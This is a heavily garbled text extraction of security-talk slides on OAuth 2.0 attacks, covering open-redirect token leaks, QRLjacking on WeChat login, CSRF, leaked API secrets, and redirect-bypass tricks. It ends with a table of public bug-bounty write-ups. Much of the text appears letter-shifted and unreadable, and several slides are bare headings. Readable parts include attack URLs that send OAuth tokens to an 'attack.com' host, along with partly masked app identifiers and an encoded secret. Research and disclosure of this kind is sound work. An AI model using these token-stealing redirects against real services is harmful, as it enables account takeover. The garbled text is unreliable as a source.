0
Speaker@YongShao

0

1

Whoami
 ,'#<RQJ6KDR      

Oauth2.0

 

 

()

!

 



$  UHTXHVWWRNHQ VHFUHW
%  & 
DFFHVVWRNHQ VHFUHW ' 
UHTXHVWWRNHQ VHFUHW! DFFHVVWRNHQ VHFUHW!



$  $XWKRUL]DWLRQ&RGH
%  DFFHVVWRNHQ
& 
$XWKRUL]DWLRQ&RGH! DFFHVVBWRNHQ!


$XWKRUL]DWLRQ&RGH IRUDSSVUXQQLQJRQD ZHEVHUYHU  EURZVHUEDVHG DQG PRELOHDSSV  3DVVZRUG IRUORJJLQJLQZLWKD XVHUQDPHDQGSDVVZRUG  &OLHQWFUHGHQWLDOV IRU DSSOLFDWLRQDFFHVV  ,PSOLFLW ZDVSUHYLRXVO\UHFRPPHQGHGIRUFOLHQWVZLWKRXWDVHFUHWEXWKDVEHHQ
VXSHUVHGHGE\XVLQJWKH$XWKRUL]DWLRQ&RGHJUDQWZLWKQRVHFUHW

Web
https://facebook.com/dialog/oa uth?response_type=code&clien t_id=CLIENT_ID&redirect_uri=R EDIRECT_URI&scope=email&sta te=1234zyx
$OORZ KWWSVH[DPSOHFRPFE"FRGH $87+B&2'(B+(5( VWDWH ]\[


 KWWSVDSLDXWKRUL]DWLRQVHUYHUFRPWRNHQ
3267  JUDQWBW\SH SDVVZRUG XVHUQDPH 86(51$0( SDVVZRUG 3$66:25' 
FOLHQWBLG &/,(17B,'




https://open.weixin.qq.com/connect/oauth 2/authorize?appid=wxc43*******&respon se_type=code&scope=snsapi_base&redirec t_uri=http://baidu.com&state=********** *&connect_redirect=1#wechat_redirect

Token Leak

Timelime:

2018.02.13
Redirect vulnerability

2018.03.20
Find token leak

2018.03.21
Report Vulnerability

2018.03.30
Fixed

Detail
 KWWSVVWDII\RQJVKDRFRPDXWKRDXWKDXWKRUL]H"FOLHQWBLG RD UHVSRQVHBW\SH WR NHQ UHGLUHFWBXUL ^XUO`VWDWH KWWSZZZ\RQJVKDRFRP
 2SHQWKHDERYH85/LIWKHUHLVQRORJLQZLOO5HGLUHFWKWWSVVWDII\RQJVKDRFRP

Detail

Detail

POC/EXP
Write js

Write php

POC/EXP

POC/EXP

IM
 
:KLWHOLVW  QHLFQ  PQHW  PFRP  PFRP
KWWSVFQKRPHQ[/RJLQ"UHGLUHFWBXUO KWWSVL[FQ


KWWSVSUHYLHZQFQLPJ"VUF KWWSDWWDFNFRP
KWWSVQFQKRPHQ[/RJLQ"UHGLUHFWBXUO KWWSV SUHYLHZQFQLPJ"VUF KWWSDWWDFNFRP
KWWSWFQ5S'



Login Redirect
 KWWSVSUHYLHZQFQLPJ"VUF KWWSDWWDFNFRP"D PDUN7RNHQ 
  aWDLODFFHVVORJ    >0D\@*(7"D +773 
KWWSVSUHYLHZQFQLPJ"VUF KWWSV[[[FRP"D PDUN7RNHQ  0R]LOOD0DFLQWRVK,QWHO0DF26;BB$SSOH:HE.LW .+70/OLNH*HFNR&KURPH6DIDUL YDUZZZKWPOLQGH[SKS



Qrljacking
  
   45    

Qrljacking

Qrljacking

KWWSVORJLQZHL[LQTTFRPMVORJLQ 3267DSSLG Z[FHFDFIIE IXQ QHZ ODQJ
]KBFQXXLG
KWWSVORJLQZHL[LQTTFRPO^XXLG` 
KWWSVORJLQZ[TTFRPFJLELQPPZHEZ[ ELQORJLQ"ORJLQLFRQ WUXH DPSXXLG ^XXLG`DPSWLS 
DPSU  DPSB   

Qrljacking

Qrljacking

Qrljacking

       

 app

 app

 app

CSRF
 KWWSORJLQVLQDFRPFQVVRFURVVGRPDLQSKS"DFWLRQ ORJLQ

CSRF
 /oauth/weibo/redirect

CSRF
([SORLW

CSRF
%\SDVV 7LSV

CSRF
LIUDPH

9LFWLP$WWDFN

LIUDPH 
 

API Leak

API Leak

KWWSVDSLZHL[LQTTFRPFJL ELQWRNHQ"JUDQWBW\SH FOLHQWBFUHGHQWLDO
DSSLG Z[ VHFUHW  HDI
5HVSRQVH ^DFFHVVBWRNHQBE:E.<OP6.:)8OZ[( RW)\-%.)EPJZ-[V L$X6RN2-MZ+-+J&)$ ;=;H[SLUHVBLQ`

API Leak

KWWSVDSLZHL[LQTTFRPFJL ELQJHWFDOOEDFNLS"DFFHVVBWRNHQ  $9$Q&-.-L$+J&)$;=;
^LSBOLVW>@`

Login Google

KWWSVDFFRXQWVJRRJOHFRP$FFRXQW&KRR VHU"VHUYLFH DK SDVVLYH WUXH FRQWLQXH KWW SVDSSHQJLQHJRRJOHFRPBDKFRQIORJLQ" FRQWLQXH KWWSDWWDFNFRP
KWWSDWWDFNFRPBDKFRQIORJLQ"VWDWH a 

%XWVWDWH HQFU\SW

Jetbrains Team Work
([DPSOH\RXWUDFN
6HWWLQJ:KLWH/LVW KWWSDGPLQKXEVHUYLFHV "WDE VHWWLQJV
 KWWSKXEDXWKORJLQ"UHVSRQVHBW\SH W RNHQ FOLHQWBLG  UHGLUHFWBXUL KWWS))EDLGXF RP) VWDWH 


$WWDFN

KWWSKXEDX WKORJLQ"UHVSRQVHBW\SH WRNH Q FOLHQWBLG  UHGLUHFWBXUL
KWWS))EDLGXFRP ) VWDWH 

KWWSWFQ55PNG\ 

6HQG $FFHVVBWRNHQ

ORJLQ

Use old poc
KWWSRDXWKDFFHVVWRNHQ [[[[[[[[ HQFRGH HUURU KWWSRDXWKDFFHVVWRNHQ [[[[[[[[ GHFRGH VXVV

xss Platform got it

Demo MP4

Other

KWWSVVVRWHOQHWFRPFDVOR JLQ"VHUYLFH KWWSVZZZVHHEXJ RUJDFFRXQWVORJLQ"QH[W )
KWWSVVVRWHOQHWFRPFDVOR JLQ"VHUYLFH KWWSVEDLGXFRP
KWWSVZZZEDLGXFRP"WLFNHW 67

Redirect Bypass

::: 2 5

/..

#2 5

::: 2 5

/..

::: 2 5

::: 2 5

::: 55 . 5 ::: 2 5

2 #5

::: 55 . 5

25

::: 55 . 5

25

::: 55 . 5

25

::: 55 . 5 % 2 5

::: 55 . 5

25

::: 55 . 5 2 5

Help Me(how to fixed)

Help Me(how to fixed)
 7LPH OLQH  9DOLGLW\  :KLWH OLVW

!  

7LWOH 85/

$XWKRU

Finding hidden gems vol. 1: forging OAuth tokens using discovered client id
and client secret

0DWHXV] 2OHMDUND

%XJERXQW\SURJUDP 9XOQHUDELOLW\ 5HZDUG 3XEOLFDWLRQGDWH



,QIRUPDWLRQ GLVFORVXUH





=HURWR$FFRXQW 7DNHRYHU+RZ, ,PSHUVRQDWHG6RPHRQH (OVH8VLQJ$XWK

'DQLHO 6YDUWPDQ

2DXWK

/RJLFIODZ





Stealing 0Auth Token $UED]+XVVDLQ
(MITM)
Stealing Access Token of
One-drive Integration By $UED]+XVVDLQ
Chaining CSRF Vulnerability
Authentication bypass on
Airbnb via OAuth tokens $UQH6ZLQQHQ
theft

  $LUEQE

2$XWKIODZ



2$XWKIODZ&65)



2$XWKIODZ/RJLQ &65)2SHQ UHGLUHFW
$XWKHQWLFDWLRQ E\SDVV



Internet Explorer has a URL problem

)LOH 'HVFULSWRU

*LWKXE*RRJOH

2$XWKIODZ532 ;66



Stealing Facebook access_tokens using CSRF
in device login flow

-RVLS )UDQMNRYLF

)DFHERRN

&65)2$XWKIODZ

,QIRUPDWLRQ



GLVFORVXUH

How I Hacked [Oculus] OAuth +Ebay +IBM

$EGXOODK +XVVDP

)DFHERRN(ED\,%0 $QVZHU+XE

8QUHVWULFWHGILOH XSORDG;66



     

Speaker@YongShao

